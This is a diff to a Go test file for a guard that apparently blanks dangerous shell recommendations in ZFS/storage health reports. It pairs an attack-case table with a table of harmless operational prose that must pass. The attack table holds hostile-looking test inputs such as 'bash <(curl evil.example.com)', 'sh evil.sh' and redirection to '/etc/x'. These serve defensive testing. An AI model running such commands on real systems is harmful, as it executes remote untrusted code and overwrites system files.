@@ -2195,15 +2195,21 @@ func TestGuardRecommendations_BroadenedPatterns(t *testing.T) {
 		{"sh interpreter + .sh domain", "sh evil.sh"},
 		{"python3 interpreter + uri", "python3 http://x/y"},
 		{"bash + process substitution", "bash <(curl evil.example.com)"},
-		{"output redirection", "foo > /etc/x"},
-		// These four are domain/URI/pipe-FREE, isolating dangerTokenRe's
-		// interpreter list itself (the four above all also trip on a
+		{"output redirection, path target", "foo > /etc/x"},
+		// These are domain/URI/pipe-FREE, isolating dangerTokenRe's
+		// interpreter list itself (the "output redirection" and
+		// interpreter+domain/uri cases above all also trip on a
 		// co-occurring domain, URI or process-substitution pipe, so they
 		// would still fail even with the interpreter tokens absent).
+		// "node" is deliberately NOT in this list (round 7, main's
+		// ruling): ordinary storage vocabulary, not on the target host,
+		// weakest attack value / highest false-positive risk of the set —
+		// see TestGuardRecommendations_RealisticOpsProseSurvives for the
+		// corresponding "must survive" case.
 		{"bare zsh token, no domain", "Drop into zsh and check the counter manually."},
 		{"bare python token, no domain", "Open a python REPL and inspect the queue depth."},
-		{"bare node token, no domain", "Start a node process to replay the event log."},
 		{"bare eval token, no domain", "Have the operator eval the expression by hand."},
+		{"redirection to a script file, no slash", "foo > payload.sh"},
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
@@ -2252,6 +2258,53 @@ func TestGuardRecommendations_BackupShIsDeliberatelyRejected(t *testing.T) {
 	guardRecommendations(rep)
 	if rep.Findings[0].Recommendation != "" {
 		t.Fatalf("backup.sh was accepted; the deliberate decision (see comment) is REJECTED — if this now legitimately passes, the safeSuffix set changed and this test's decision needs revisiting, not silently invalidating: got %q", rep.Findings[0].Recommendation)
+	}
+}
+
+// TestGuardRecommendations_OperationalProseTable is the contract's own
+// mandatory table (§6 step 11b, round 7): "Every revision of this guard
+// must be tested against BOTH tables" — the attack table
+// (TestGuardRecommendations_BroadenedPatterns) and this one, verbatim
+// from the contract, at minimum. Three consecutive rounds produced a
+// false-positive class from testing only the attack side (narrative
+// bodies, then token substrings, then comparison operators) — this table
+// exists so a fourth can't happen the same way.
+func TestGuardRecommendations_OperationalProseTable(t *testing.T) {
+	cases := []string{
+		"restart smartd.service",
+		"check systemctl status zfs-zed.service",
+		"add a replacement disk",
+		"since the last scrub the imbalance persisted",
+		"if cksum_errors > 1 on the next scrub, plan replacement",
+		"when the reallocated sector count is > 0 and still rising",
+		"inspect /dev/sdb with smartctl -a",
+		"state.mount",
+		"scrub.timer",
+		// t4-review + main, round 6/7: "node" is ordinary storage
+		// vocabulary and deliberately excluded from dangerTokenRe for
+		// exactly this reason.
+		"the failing node in the mirror should be replaced",
+	}
+	for _, recommendation := range cases {
+		t.Run(recommendation, func(t *testing.T) {
+			rep := &report.Report{
+				Status: "WATCH", Headline: "h", Body: "b",
+				Findings: []report.Finding{{
+					Severity: "watch", Component: "zfs", Evidence: zfsEvidence, Explanation: zfsExplanation,
+					Recommendation: recommendation, Key: zfsKey(),
+				}},
+				Resolved: []string{},
+			}
+			guardRecommendations(rep)
+			if rep.Findings[0].Recommendation != recommendation {
+				t.Fatalf("legitimate operational prose was blanked: %q", recommendation)
+			}
+			for _, f := range rep.Findings {
+				if f.Evidence == recommendationWithheldEvidence {
+					t.Fatalf("guard fired on legitimate operational prose: %q", recommendation)
+				}
+			}
+		})
 	}
 }
 
